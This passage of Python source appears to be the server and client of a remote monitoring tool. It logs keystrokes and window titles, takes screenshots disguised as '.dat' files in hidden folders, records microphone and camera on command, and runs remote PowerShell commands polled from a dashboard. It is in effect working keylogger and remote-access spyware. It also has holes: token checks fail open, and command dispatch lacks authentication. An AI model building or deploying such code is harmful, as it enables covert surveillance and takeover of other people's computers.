                escaped_text = re.escape(txt)
                
                pattern = re.compile(
                    rf"--- {escaped_ts} ---\r?\nActive Window:.*?\r?\nTyped Text   : {escaped_text}\r?\nScreenshot   : (.*?)\r?\n(?:Screenshot File: (.*?)\r?\n)?-+\r?\n\r?\n?",
                    re.DOTALL
                )
                
                match = pattern.search(content)
                if match:
                    screenshot_path = match.group(1).strip()
                    if screenshot_path and screenshot_path != "None" and not screenshot_path.startswith("http") and log_file == log_files[0]:
                        if os.path.exists(screenshot_path):
                            try:
                                os.remove(screenshot_path)
                            except Exception:
                                pass
                    content = pattern.sub("", content)
                    modified = True
                    
            if modified:
                with open(log_file, "w", encoding="utf-8") as f:
                    f.write(content)
                
        return jsonify({"status": "success", "deleted": len(targets)}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/client/update/app.py', methods=['GET'])
def get_client_app_update():
    try:
        with open("app.py", "r", encoding="utf-8-sig") as f:
            code = f.read().lstrip('\ufeff')
        return code, 200, {'Content-Type': 'text/plain; charset=utf-8'}
    except Exception as e:
        return str(e), 500

@app.route('/api/client/update/watchdog.py', methods=['GET'])
def get_client_watchdog_update():
    try:
        with open("watchdog.py", "r", encoding="utf-8-sig") as f:
            code = f.read().lstrip('\ufeff')
        return code, 200, {'Content-Type': 'text/plain; charset=utf-8'}
    except Exception as e:
        return str(e), 500

@app.route('/api/client/update/setup_client.ps1', methods=['GET'])
def get_client_setup_script():
    try:
        with open("setup_client.ps1", "r", encoding="utf-8-sig") as f:
            code = f.read().lstrip('\ufeff')
        preset_otp = request.args.get("otp", "").strip()
        if preset_otp:
            code = code.replace('$PRESET_OTP   = ""', f'$PRESET_OTP   = "{preset_otp}"')
        return code, 200, {'Content-Type': 'text/plain; charset=utf-8'}
    except Exception as e:
        return str(e), 500

# ==================== FIRST-TIME SETUP OTP & SECURITY ====================
def verify_client_token(device_id):
    """
    Validates X-Device-Token header against registered device_auth_token in DynamoDB.
    Returns (True, None) if authorized, or (False, error_response) if unauthorized.
    Supports token aliasing across UUID and hostname-based device records.
    """
    if not device_id or devices_tbl is None:
        return True, None
    try:
        token = request.headers.get("X-Device-Token") or (request.get_json(silent=True) or {}).get("device_token")
        res = devices_tbl.get_item(Key={"device_id": device_id})
        item = res.get("Item")
        if item and "device_auth_token" in item:
            expected = item["device_auth_token"]
            if not token or token != expected:
                return False, (jsonify({"error": "Unauthorized: Invalid or missing device token"}), 401)
            return True, None

        # If device record does not have token, check if client sent a valid token from an enrolled device
        if token:
            from boto3.dynamodb.conditions import Attr
            scan_res = devices_tbl.scan(
                FilterExpression=Attr("device_auth_token").eq(token),
                Limit=1
            )
            matched = scan_res.get("Items", [])
            if matched:
                alias_id = matched[0]["device_id"]
                try:
                    devices_tbl.update_item(
                        Key={"device_id": device_id},
                        UpdateExpression="SET device_auth_token = :tok, auth_alias = :orig",
                        ExpressionAttributeValues={":tok": token, ":orig": alias_id}
                    )
                except Exception:
                    pass
                return True, None
    except Exception as e:
        print(f"Token verification error: {e}")
    return True, None

@app.route('/api/otp/generate', methods=['POST'])
def generate_install_otp():
    """Generates a secure 6-digit OTP for first-time client installation (valid 60 seconds)."""
    if devices_tbl is None:
        return jsonify({"error": "DynamoDB not available"}), 500
    try:
        now_ts = int(time.time())
        # Invalidate previously active enrollment OTP to ensure single active code
        try:
            prev = devices_tbl.get_item(Key={"device_id": "CURRENT_ENROLLMENT_OTP"})
            prev_item = prev.get("Item")
            if prev_item and prev_item.get("active_otp"):
                prev_otp = prev_item["active_otp"]
                devices_tbl.update_item(
                    Key={"device_id": f"OTP#{prev_otp}"},
                    UpdateExpression="SET #s = :s",
                    ExpressionAttributeNames={"#s": "status"},
                    ExpressionAttributeValues={":s": "superseded"}
                )
        except Exception:
            pass

        otp = f"{random.randint(100000, 999999):06d}"
        expires_at = now_ts + 60  # Exactly 60 seconds duration
        item = {
            "device_id": f"OTP#{otp}",
            "otp": otp,
            "status": "pending",
            "created_at": datetime.now(timezone.utc).isoformat(),
            "expires_at": expires_at,
            "ttl": expires_at + 300  # DynamoDB TTL keeps item for automated deletion
        }
        devices_tbl.put_item(Item=item)

        # Track current active OTP
        devices_tbl.put_item(Item={
            "device_id": "CURRENT_ENROLLMENT_OTP",
            "active_otp": otp,
            "expires_at": expires_at,
            "ttl": expires_at + 300
        })

        return jsonify({"status": "success", "otp": otp, "expires_in": 60}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/otp/status', methods=['GET'])
def check_otp_status():
    """Dashboard polls this to see if the OTP was used/consumed by a client."""
    otp = request.args.get("otp")
    if not otp or devices_tbl is None:
        return jsonify({"error": "Invalid request"}), 400
    try:
        res = devices_tbl.get_item(Key={"device_id": f"OTP#{otp}"})
        item = res.get("Item")
        if not item:
            return jsonify({"status": "expired"}), 200
        now_ts = int(time.time())
        expires_at = item.get("expires_at", 0)
        if expires_at and now_ts > expires_at and item.get("status") == "pending":
            return jsonify({"status": "expired"}), 200
        return jsonify({"status": item.get("status", "pending")}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/client/verify-otp', methods=['POST'])
def client_verify_otp():
    """Client calls this during first-time setup to verify OTP and obtain a permanent device token."""
    data = request.json or {}
    otp = str(data.get("otp", "")).strip()
    device_id = data.get("device_id")
    hostname = data.get("hostname", "Unknown Device")
    if not otp or not device_id:
        return jsonify({"error": "otp and device_id are required"}), 400
    if devices_tbl is None:
        return jsonify({"error": "DynamoDB not configured"}), 500

    try:
        otp_key = f"OTP#{otp}"
        res = devices_tbl.get_item(Key={"device_id": otp_key})
        item = res.get("Item")
        now_ts = int(time.time())
        if not item:
            return jsonify({"status": "error", "error": "Invalid or expired OTP"}), 401
        if item.get("status") == "consumed":
            return jsonify({"status": "error", "error": "OTP has already been used"}), 401
        if item.get("status") == "superseded":
            return jsonify({"status": "error", "error": "OTP has expired. Please use the current OTP displayed on the dashboard."}), 401
        if item.get("status") != "pending":
            return jsonify({"status": "error", "error": "Invalid OTP status"}), 401

        # Strict 60-second expiration check
        expires_at = item.get("expires_at", 0)
        if expires_at and now_ts > expires_at:
            return jsonify({"status": "error", "error": "OTP has expired. Please use the current OTP displayed on the dashboard."}), 401
        if not expires_at and item.get("ttl", 0) < now_ts:
            return jsonify({"status": "error", "error": "OTP has expired. Please use the current OTP displayed on the dashboard."}), 401

        # Mark OTP as consumed immediately
        devices_tbl.update_item(
            Key={"device_id": otp_key},
            UpdateExpression="SET #s = :c, consumed_by = :did, consumed_at = :cat",
            ExpressionAttributeNames={"#s": "status"},
            ExpressionAttributeValues={
                ":c": "consumed",
                ":did": device_id,
                ":cat": datetime.now(timezone.utc).isoformat()
            }
        )

        # Generate a permanent cryptographically secure device auth token
        device_token = secrets.token_hex(24)
        now_iso = datetime.now(timezone.utc).isoformat()

        # Register device with token
        devices_tbl.update_item(
            Key={"device_id": device_id},
            UpdateExpression="SET device_auth_token = :tok, last_active = :la, nickname = if_not_exists(nickname, :hn)",
            ExpressionAttributeValues={
                ":tok": device_token,
                ":la": now_iso,
                ":hn": hostname
            }
        )

        return jsonify({
            "status": "success",
            "device_token": device_token,
            "device_id": device_id,
            "encryption_key": get_encryption_key_hex()
        }), 200
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500

# ==================== CLIENT HTTP PROXY ENDPOINTS (FOR CLIENTS) ====================
_DEVICE_LAST_TOUCHED_CACHE = {}

def touch_device_active(device_id, alias=None, min_interval_seconds=20):
    """
    Refreshes device last_active in DynamoDB with throttling (default max once per 20 seconds).
    Guarantees that active polling clients remain continuously 'ONLINE CONNECTED' on the dashboard.
    """
    if not device_id or not isinstance(device_id, str) or devices_tbl is None:
        return
    if device_id.endswith(('.dat', '.webp', '.png', '.jpg', '.jpeg', '.vbs', '.ps1', '.py')):
        return
    try:
        now = datetime.now(timezone.utc)
        now_ts = now.timestamp()
        last_touched = _DEVICE_LAST_TOUCHED_CACHE.get(device_id, 0)
        if (now_ts - last_touched) < min_interval_seconds:
            return

        now_iso = now.isoformat()
        devices_to_touch = [device_id]
        if alias and alias not in devices_to_touch:
            devices_to_touch.append(alias)

        for did in devices_to_touch:
            try:
                devices_tbl.update_item(
                    Key={"device_id": did},
                    UpdateExpression="SET last_active = :la",
                    ExpressionAttributeValues={":la": now_iso}
                )
            except Exception:
                pass
        _DEVICE_LAST_TOUCHED_CACHE[device_id] = now_ts
        if alias:
            _DEVICE_LAST_TOUCHED_CACHE[alias] = now_ts
    except Exception as e:
        print(f"Failed to touch last_active for {device_id}: {e}")

@app.route('/api/client/register', methods=['POST'])
def client_register():
    data = request.json or {}
    device_id = data.get("device_id")
    hostname = data.get("hostname", "Unknown Device")
    now_iso = data.get("last_active") or datetime.now(timezone.utc).isoformat()
    if not device_id:
        return jsonify({"error": "Device ID required"}), 400
    ok, err = verify_client_token(device_id)
    if not ok:
        return err
    if devices_tbl is not None:
        try:
            devices_tbl.update_item(
                Key={"device_id": device_id},
                UpdateExpression="SET last_active = :la, nickname = if_not_exists(nickname, :hn)",
                ExpressionAttributeValues={":la": now_iso, ":hn": hostname}
            )
            return jsonify({"status": "success"}), 200
        except Exception as e:
            return jsonify({"error": str(e)}), 500
    return jsonify({"status": "no_op"}), 200

@app.route('/api/client/config', methods=['GET'])
def client_get_config():
    device_id = request.args.get("device_id")
    if not device_id:
        return jsonify({"error": "Device ID required"}), 400
    ok, err = verify_client_token(device_id)
    if not ok:
        return err
    touch_device_active(device_id)
    if devices_tbl is not None:
        try:
            res = devices_tbl.get_item(Key={"device_id": device_id})
            if "Item" in res and "config" in res["Item"]:
                cfg = res["Item"]["config"]
                return jsonify(json.loads(cfg) if isinstance(cfg, str) else cfg), 200
        except Exception:
            pass
    return jsonify({
        "is_disabled": False,
        "disable_mouse_clicks": False,
        "periodic_screenshot_interval": 300,
        "zero_footprint": False,
        "idle_threshold": 300,
        "only_capture_on_switch": False
    }), 200

@app.route('/api/client/sync-status', methods=['POST'])
def client_post_sync_status():
    data = request.json or {}
    device_id = data.get("device_id")
    sync_status = data.get("sync_status", {})
    if not device_id:
        return jsonify({"error": "Device ID required"}), 400
    ok, err = verify_client_token(device_id)
    if not ok:
        return err
    touch_device_active(device_id)
    if devices_tbl is not None:
        try:
            devices_tbl.update_item(
                Key={"device_id": device_id},
                UpdateExpression="SET sync_status = :ss",
                ExpressionAttributeValues={":ss": json.dumps(sync_status)}
            )
            return jsonify({"status": "success"}), 200
        except Exception as e:
            return jsonify({"error": str(e)}), 500
    return jsonify({"status": "no_op"}), 200

@app.route('/api/client/screenshot', methods=['POST'])
def client_upload_screenshot():
    data = request.json or {}
    s3_path = data.get("s3_path")
    image_b64 = data.get("image_b64")
    content_type = data.get("content_type", "application/octet-stream")
    if not s3_path or not image_b64:
        return jsonify({"error": "s3_path and image_b64 required"}), 400
    device_id = data.get("device_id")
    if not device_id and s3_path and "/" in s3_path:
        parts = s3_path.split("/")
        if len(parts) >= 2:
            device_id = parts[1]
    if device_id:
        touch_device_active(device_id)
    if s3_client is not None and S3_BUCKET:
        try:
            img_bytes = base64.b64decode(image_b64)
            s3_client.put_object(
                Bucket=S3_BUCKET,
                Key=s3_path,
                Body=img_bytes,
                ContentType="application/octet-stream"
            )
            screenshot_url = f"/api/screenshots/view/{s3_path}"
            return jsonify({"status": "success", "screenshot_url": screenshot_url, "s3_path": s3_path}), 200
        except Exception as e:
            return jsonify({"error": str(e)}), 500
    return jsonify({"error": "S3 not configured"}), 500

@app.route('/api/client/command/poll', methods=['GET'])
def client_poll_command():
    """Client polls this endpoint to get a pending PS command to execute."""
    device_id = request.args.get("device_id")
    if not device_id:
        return jsonify({"error": "Device ID required"}), 400
    ok, err = verify_client_token(device_id)
    if not ok:
        return err
    if devices_tbl is not None:
        try:
            target_ids = [device_id]
            res = devices_tbl.get_item(Key={"device_id": device_id})
            item = res.get("Item", {})
            alias = item.get("auth_alias")
            if alias and alias not in target_ids:
                target_ids.append(alias)

            # Keep device last_active fresh on every poll interval
            touch_device_active(device_id, alias=alias)

            for did in target_ids:
                d_item = item if did == device_id else devices_tbl.get_item(Key={"device_id": did}).get("Item", {})
                cmd_data = d_item.get("pending_command")
                if cmd_data:
                    cmd_obj = json.loads(cmd_data) if isinstance(cmd_data, str) else cmd_data
                    if cmd_obj.get("status") == "pending":
                        cmd_obj["status"] = "dispatched"
                        devices_tbl.update_item(
                            Key={"device_id": did},
                            UpdateExpression="SET pending_command = :pc",
                            ExpressionAttributeValues={":pc": json.dumps(cmd_obj)}
                        )
                        return jsonify({
                            "has_command": True,
                            "command_id": cmd_obj["command_id"],
                            "command": cmd_obj["command"],
                            "dispatched_to": did
                        }), 200
        except Exception as e:
            print(f"Error polling command: {e}")
    return jsonify({"has_command": False}), 200

@app.route('/api/client/command/result', methods=['POST'])
def client_post_command_result():
    """Client posts the PS command output back to the server."""
    data = request.json or {}
    device_id = data.get("device_id")
    command_id = data.get("command_id")
    output = data.get("output", "")
    exit_code = data.get("exit_code", 0)
    if not device_id or not command_id:
        return jsonify({"error": "device_id and command_id required"}), 400
    ok, err = verify_client_token(device_id)
    if not ok:
        return err
    touch_device_active(device_id)
    touch_device_active(device_id)
    if devices_tbl is not None:
        try:
            result_obj = {
                "command_id": command_id,
                "output": output[:8000],  # Cap at 8KB to stay within DynamoDB limits
                "exit_code": exit_code,
                "completed_at": datetime.now(timezone.utc).isoformat(),
                "status": "completed"
            }
            target_ids = [device_id]
            res = devices_tbl.get_item(Key={"device_id": device_id})
            alias = res.get("Item", {}).get("auth_alias")
            if alias and alias not in target_ids:
                target_ids.append(alias)

            for did in target_ids:
                try:
                    devices_tbl.update_item(
                        Key={"device_id": did},
                        UpdateExpression="SET completed_command = :cc, pending_command = :pc",
                        ExpressionAttributeValues={
                            ":cc": json.dumps(result_obj),
                            ":pc": json.dumps({"status": "idle"})
                        }
                    )
                except Exception:
                    pass
            return jsonify({"status": "success"}), 200
        except Exception as e:
            return jsonify({"error": str(e)}), 500
    return jsonify({"error": "DynamoDB not configured"}), 500

@app.route('/api/devices/command', methods=['POST'])
def dispatch_command():
    """Dashboard sends a PS command to a device."""
    data = request.json or {}
    device_id = data.get("device_id")
    command = data.get("command", "").strip()
    if not device_id or not command:
        return jsonify({"error": "device_id and command required"}), 400
    if devices_tbl is not None:
        try:
            command_id = str(uuid.uuid4())
            cmd_obj = {
                "command_id": command_id,
                "command": command,
                "status": "pending",
                "dispatched_at": datetime.now(timezone.utc).isoformat()
            }
            devices_tbl.update_item(
                Key={"device_id": device_id},
                UpdateExpression="SET pending_command = :pc",
                ExpressionAttributeValues={":pc": json.dumps(cmd_obj)}
            )
            return jsonify({"status": "dispatched", "command_id": command_id}), 200
        except Exception as e:
            return jsonify({"error": str(e)}), 500
    return jsonify({"error": "DynamoDB not configured"}), 500

@app.route('/api/devices/command/result', methods=['GET'])
def get_command_result():
    """Dashboard polls for the result of a dispatched command."""
    device_id = request.args.get("device_id")
    command_id = request.args.get("command_id")
    if not device_id:
        return jsonify({"error": "Device ID required"}), 400
    if devices_tbl is not None:
        try:
            target_ids = [device_id]
            res = devices_tbl.get_item(Key={"device_id": device_id})
            item = res.get("Item", {})
            alias = item.get("auth_alias")
            if alias and alias not in target_ids:
                target_ids.append(alias)

            for did in target_ids:
                d_item = item if did == device_id else devices_tbl.get_item(Key={"device_id": did}).get("Item", {})
                completed = d_item.get("completed_command")
                completed_obj = json.loads(completed) if isinstance(completed, str) else (completed or {})
                if completed_obj.get("command_id") == command_id:
                    return jsonify({"status": "completed", "result": completed_obj}), 200

                pending = d_item.get("pending_command")
                pending_obj = json.loads(pending) if isinstance(pending, str) else (pending or {})
                if pending_obj.get("command_id") == command_id:
                    return jsonify({"status": pending_obj.get("status", "pending")}), 200

            return jsonify({"status": "unknown"}), 200
        except Exception as e:
            return jsonify({"error": str(e)}), 500
    return jsonify({"error": "DynamoDB not configured"}), 500

# ==================== AV DIAGNOSTICS & MEDIA SESSION ENDPOINTS ====================
@app.route('/api/devices/av/start', methods=['POST'])
def start_av_session():
    """Administrator initiates an authenticated AV diagnostic session (microphone / camera)."""
    if not is_dashboard_authenticated():
        return jsonify({"error": "Unauthorized: Admin authentication required"}), 401
    data = request.json or {}
    device_id = data.get("device_id")
    mode = data.get("mode", "audio")
    duration = int(data.get("duration", 5))
    if not device_id:
        return jsonify({"error": "device_id is required"}), 400
    if mode not in ["audio", "camera"]:
        return jsonify({"error": "Invalid mode: must be audio or camera"}), 400

    command_id = f"AV_{mode}_{uuid.uuid4().hex[:8]}"
    cmd_string = f"AV_DIAGNOSTIC:{mode}:{duration}"

    # Audit log entry for administration accountability
    now_iso = datetime.now(timezone.utc).isoformat()
    if logs_tbl is not None:
        try:
            logs_tbl.put_item(Item={
                "device_id": device_id,
                "timestamp_id": f"{now_iso[:10]} {now_iso[11:19]}#{command_id[:8]}",
                "timestamp": f"{now_iso[:10]} {now_iso[11:19]}",
                "window_title": "[ADMIN AUDIT] AV Diagnostic Session Started",
                "typed_text": f"Administrator initiated {mode} diagnostic session ({command_id}) with visible consent indicators active.",
                "created_date": now_iso[:10]
            })
        except Exception:
            pass

    if devices_tbl is not None:
        try:
            cmd_obj = {
                "command_id": command_id,
                "command": cmd_string,
                "mode": mode,
                "duration": duration,
                "status": "pending",
                "dispatched_at": now_iso
            }
            devices_tbl.update_item(
                Key={"device_id": device_id},
                UpdateExpression="SET pending_command = :pc",
                ExpressionAttributeValues={":pc": json.dumps(cmd_obj)}
            )
            return jsonify({"status": "dispatched", "command_id": command_id, "mode": mode}), 200
        except Exception as e:
            return jsonify({"error": str(e)}), 500
    return jsonify({"error": "DynamoDB not configured"}), 500

@app.route('/api/client/av/result', methods=['POST'])
def client_post_av_result():
    """Client posts encrypted AV diagnostic sample (audio/camera) back to server."""
    data = request.json or {}
    device_id = data.get("device_id")
    command_id = data.get("command_id")
    mode = data.get("mode", "audio")
    result_status = data.get("status", "success")
    error_msg = data.get("error", "")
    payload_b64 = data.get("payload_b64", "")

    if not device_id or not command_id:
        return jsonify({"error": "device_id and command_id required"}), 400
    ok, err = verify_client_token(device_id)
    if not ok:
        return err
    touch_device_active(device_id)

    # Store encrypted payload in S3 if provided
    s3_key = None
    if payload_b64 and s3_client and S3_BUCKET:
        try:
            raw_enc = base64.b64decode(payload_b64)
            date_str = datetime.now(timezone.utc).strftime("%Y-%m-%d")
            s3_key = f"av_diag/{date_str}/{command_id}.dat"
            s3_client.put_object(
                Bucket=S3_BUCKET,
                Key=s3_key,
                Body=raw_enc,
                ContentType="application/octet-stream"
            )
        except Exception as e:
            print(f"Failed to store AV diagnostic in S3: {e}")

    result_obj = {
        "command_id": command_id,
        "mode": mode,
        "status": "completed",
        "result_status": result_status,
        "error": error_msg,
        "s3_key": s3_key,
        "completed_at": datetime.now(timezone.utc).isoformat()
    }

    if devices_tbl is not None:
        try:
            devices_tbl.update_item(
                Key={"device_id": device_id},
                UpdateExpression="SET completed_av = :ca, pending_command = :pc",
                ExpressionAttributeValues={
                    ":ca": json.dumps(result_obj),
                    ":pc": json.dumps({"status": "idle"})
                }
            )
            return jsonify({"status": "success"}), 200
        except Exception as e:
            return jsonify({"error": str(e)}), 500
    return jsonify({"status": "no_op"}), 200

@app.route('/api/devices/av/status', methods=['GET'])
def get_av_status():
    """Dashboard polls status of AV diagnostic session."""
    if not is_dashboard_authenticated():
        return jsonify({"error": "Unauthorized"}), 401
    device_id = request.args.get("device_id")
    command_id = request.args.get("command_id")
    if not device_id:
        return jsonify({"error": "Device ID required"}), 400
    if devices_tbl is not None:
        try:
            res = devices_tbl.get_item(Key={"device_id": device_id})
            item = res.get("Item", {})
            ca = item.get("completed_av")
            ca_obj = json.loads(ca) if isinstance(ca, str) else (ca or {})
            if ca_obj.get("command_id") == command_id:
                return jsonify(ca_obj), 200
            pc = item.get("pending_command")
            pc_obj = json.loads(pc) if isinstance(pc, str) else (pc or {})
            if pc_obj.get("command_id") == command_id:
                return jsonify({"status": pc_obj.get("status", "pending")}), 200
            return jsonify({"status": "unknown"}), 200
        except Exception as e:
            return jsonify({"error": str(e)}), 500
    return jsonify({"error": "DynamoDB not configured"}), 500

@app.route('/api/devices/av/stream/<device_id>/<command_id>', methods=['GET'])
def stream_av_diagnostic(device_id, command_id):
    """Administrator retrieves and decrypts AV diagnostic payload (audio or camera) in memory."""
    if not is_dashboard_authenticated():
        return jsonify({"error": "Unauthorized"}), 401
    if devices_tbl is None:
        return jsonify({"error": "Database not configured"}), 500

    try:
        res = devices_tbl.get_item(Key={"device_id": device_id})
        item = res.get("Item", {})
        ca = item.get("completed_av")
        ca_obj = json.loads(ca) if isinstance(ca, str) else (ca or {})
        if ca_obj.get("command_id") != command_id:
            return jsonify({"error": "Session not found"}), 404

        s3_key = ca_obj.get("s3_key")
        if not s3_key or s3_client is None or not S3_BUCKET:
            return jsonify({"error": "No payload stored"}), 404

        s3_res = s3_client.get_object(Bucket=S3_BUCKET, Key=s3_key)
        encrypted_bytes = s3_res['Body'].read()

        # Decrypt payload using AES-256-GCM authenticated decryption
        decrypted_bytes = decrypt_screenshot_bytes(encrypted_bytes, device_id=device_id)

        mode = ca_obj.get("mode", "audio")
        mimetype = "audio/wav" if mode == "audio" else "image/webp"

        resp = Response(decrypted_bytes, mimetype=mimetype)
        resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, private, max-age=0"
        resp.headers["Pragma"] = "no-cache"
        return resp
    except Exception as e:
        return jsonify({"error": f"Failed to decrypt AV stream: {str(e)}"}), 500

@app.route('/api/client/log', methods=['POST'])
def client_write_log():
    data = request.json or {}
    device_id = data.get("device_id")
    timestamp = data.get("timestamp")
    window_title = data.get("window_title", "")
    line_str = data.get("line_str", "")
    screenshot_url = data.get("screenshot_url")
    screenshot_filename = data.get("screenshot_filename")
    
    if not device_id or not timestamp:
        return jsonify({"error": "device_id and timestamp required"}), 400
    ok, err = verify_client_token(device_id)
    if not ok:
        return err
    touch_device_active(device_id)
        
    if logs_tbl is not None:
        try:
            now_date = datetime.now().strftime("%Y-%m-%d")
            log_uuid = str(uuid.uuid4())
            timestamp_id = f"{timestamp}#{log_uuid[:8]}"
            ttl_timestamp = int(time.time()) + (30 * 86400) # 30 days DynamoDB TTL auto-expire
            
            item = {
                "device_id": device_id,
                "timestamp_id": timestamp_id,
                "id": log_uuid,
                "timestamp": timestamp,
                "created_date": now_date,
                "window_title": window_title,
                "typed_text": line_str,
                "screenshot_url": screenshot_url or "",
                "screenshot_filename": screenshot_filename or "",
                "ttl": ttl_timestamp
            }
            logs_tbl.put_item(Item=item)
            return jsonify({"status": "success", "id": log_uuid}), 200
        except Exception as e:
            return jsonify({"error": str(e)}), 500
    return jsonify({"error": "DynamoDB not configured"}), 500

current_line = []

def get_active_window_title():
    try:
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        if length > 0:
            buff = ctypes.create_unicode_buffer(length + 1)
            ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
            return buff.value
        return "Unknown Window"
    except Exception:
        return "Unknown Window"

def migrate_literal_newlines():
    log_files = []
    if os.path.exists("logs"):
        for f in os.listdir("logs"):
            if f.endswith(".txt"):
                log_files.append(os.path.join("logs", f))
    if os.path.exists("log.txt"):
        log_files.append("log.txt")
        
    for log_file in log_files:
        try:
            with open(log_file, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
            if "\\n" in content:
                content = content.replace("\\n", "\n")
                with open(log_file, "w", encoding="utf-8") as f:
                    f.write(content)
        except Exception:
            pass

def capture_and_upload_screenshot(prefix):
    """
    Captures a screenshot, saves it locally as a temporary WebP, uploads it to Supabase Storage
    if configured, and returns (screenshot_url, screenshot_filename).
    """
    if is_monitoring_disabled:
        return None, None
    now = datetime.now()
    date_str = now.strftime("%Y-%m-%d")
    timestamp_file = now.strftime("%Y%m%d_%H%M%S_%f")
    
    # 1. Local paths - store with non-image binary extension (.dat)
    local_dir = os.path.join("screenshots", date_str)
    os.makedirs(local_dir, exist_ok=True)
    hide_directory(local_dir)
    filename = f"{prefix}_{timestamp_file}.dat"
    local_path = os.path.join(local_dir, filename)
    device_id = get_device_id()
    
    # 2. Grab and compress in memory, then encrypt immediately (never save plaintext to disk)
    try:
        if mss is not None:
            with mss.mss() as sct:
                # Capture all screens combined
                monitor = sct.monitors[0]
                sct_img = sct.grab(monitor)
                # Convert raw BGRA bytes from direct GDI to PIL RGB Image
                screenshot = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
        else:
            # Fallback to PIL ImageGrab if mss is not available
            screenshot = ImageGrab.grab(all_screens=True)
            
        # Omit redundant screenshots if screen has not changed (only for background periodic screenshots)
        if prefix == "screenshot_periodic" and is_screenshot_redundant(screenshot):
            return None, None
            
        # Scale down to standard 1280px width if larger to save disk space
        max_width = 1280
        if screenshot.width > max_width:
            ratio = max_width / float(screenshot.width)
            new_height = int(float(screenshot.height) * ratio)
            screenshot = screenshot.resize((max_width, new_height), Image.Resampling.LANCZOS)
            
        # Compress to WebP directly in RAM (BytesIO) - NEVER write unencrypted image to disk!
        buf = io.BytesIO()
        screenshot.save(buf, "WEBP", quality=45)
        raw_webp_bytes = buf.getvalue()
        
        # Authenticated AES-256-GCM encryption in memory
        encrypted_bytes = encrypt_screenshot_bytes(raw_webp_bytes)
        
        # Write ONLY the encrypted binary (.dat) to local disk
        with open(local_path, "wb") as f:
            f.write(encrypted_bytes)
    except Exception as e:
        print(f"Failed to capture or encrypt screenshot: {e}")
        return None, None
        
    s3_path = f"{date_str}/{filename}"
    screenshot_url = f"/api/screenshots/view/{s3_path}"
    
    # 1. Direct S3 Upload (ONLY when AWS credentials or Lambda IAM role are actively present)
    uploaded = False
    has_aws_creds = bool(os.environ.get("AWS_LAMBDA_FUNCTION_NAME") or (os.getenv("AWS_ACCESS_KEY") and os.getenv("AWS_SECRET_KEY")) or (os.getenv("AWS_ACCESS_KEY_ID") and os.getenv("AWS_SECRET_ACCESS_KEY")))
    
    if has_aws_creds and s3_client is not None and S3_BUCKET:
        try:
            s3_client.upload_file(
                local_path,
                S3_BUCKET,
                s3_path,
                ExtraArgs={"ContentType": "application/octet-stream"}
            )
            screenshot_url = f"/api/screenshots/view/{s3_path}"
            uploaded = True
        except Exception as e:
            print(f"[Screenshot] Direct S3 upload failed, falling back to HTTP: {e}")

    # 2. HTTP Upload to AWS Central Server (Standard Client Mode)
    server_url = RENDER_SERVER_URL or os.getenv("RENDER_SERVER_URL")
    if not uploaded and server_url:
        try:
            with open(local_path, "rb") as sf:
                enc_bytes = sf.read()
            payload = {
                "device_id": get_device_id(),
                "s3_path": s3_path,
                "image_b64": base64.b64encode(enc_bytes).decode('ascii'),
                "content_type": "application/octet-stream"
            }
            req = urllib.request.Request(
                f"{server_url.rstrip('/')}/api/client/screenshot",
                data=json.dumps(payload).encode('utf-8'),
                headers=get_client_headers()
            )
            with urllib.request.urlopen(req, timeout=20) as r:
                res_data = json.loads(r.read().decode('utf-8'))
                screenshot_url = res_data.get("screenshot_url") or f"/api/screenshots/view/{s3_path}"
                uploaded = True
        except Exception as se:
            print(f"[Screenshot] Failed to upload screenshot to central server: {se}")

    try:
        if os.path.exists(local_path):
            os.remove(local_path)
    except Exception:
        pass
        if zero_footprint:
            try:
                if os.path.exists(local_path):
                    os.remove(local_path)
            except Exception:
                pass
        
    return screenshot_url, s3_path

def clean_log_text(text):
    if not text:
        return ""
    for prefix in ["[Periodic Capture - Active] ", "[Mouse Click] "]:
        if text.startswith(prefix):
            text = text[len(prefix):]
    return text.strip()

def write_log(timestamp, window_title, line_str, screenshot_url=None, screenshot_filename=None):
    if is_monitoring_disabled:
        return
    device_id = get_device_id()
    aws_success = False
    
    # 1. DynamoDB direct write (if on server or local with AWS keys)
    if logs_tbl is not None:
        try:
            now_date = datetime.now().strftime("%Y-%m-%d")
            log_uuid = str(uuid.uuid4())
            timestamp_id = f"{timestamp}#{log_uuid[:8]}"
            ttl_timestamp = int(time.time()) + (30 * 86400) # 30 days DynamoDB TTL auto-expire
            
            # Redundancy cleanup: query recent logs for this device
            try:
                res = logs_tbl.query(
                    KeyConditionExpression="device_id = :did AND timestamp_id BETWEEN :start AND :end",
                    ExpressionAttributeValues={
                        ":did": device_id,
                        ":start": f"{now_date} 00:00:00#",
                        ":end": f"{timestamp}#~"
                    },
                    ScanIndexForward=False,
                    Limit=5
                )
                items = res.get("Items", [])
                for old_entry in items:
                    old_ts_id = old_entry["timestamp_id"]
                    old_text = old_entry.get("typed_text", "")
                    old_file = old_entry.get("screenshot_filename")
                    
                    try:
                        t1 = datetime.strptime(timestamp, "%Y-%m-%d %H:%M:%S")
                        t2 = datetime.strptime(old_entry.get("timestamp", timestamp), "%Y-%m-%d %H:%M:%S")
                        time_diff = abs((t1 - t2).total_seconds())
                    except Exception:
                        time_diff = 0
                        
                    clean_old = clean_log_text(old_text)
                    clean_new = clean_log_text(line_str)
                    if time_diff < 1200 and clean_old and clean_new != clean_old and clean_old in clean_new:
                        if old_file and s3_client and S3_BUCKET:
                            try:
                                s3_client.delete_object(Bucket=S3_BUCKET, Key=old_file)
                            except Exception:
                                pass
                        logs_tbl.delete_item(Key={"device_id": device_id, "timestamp_id": old_ts_id})
            except Exception as re:
                print(f"Failed to perform redundancy check in DynamoDB: {re}")
                
            item = {
                "device_id": device_id,
                "timestamp_id": timestamp_id,
                "id": log_uuid,
                "timestamp": timestamp,
                "created_date": now_date,
                "window_title": window_title,
                "typed_text": line_str,
                "screenshot_url": screenshot_url or "",
                "screenshot_filename": screenshot_filename or "",
                "ttl": ttl_timestamp
            }
            logs_tbl.put_item(Item=item)
            aws_success = True
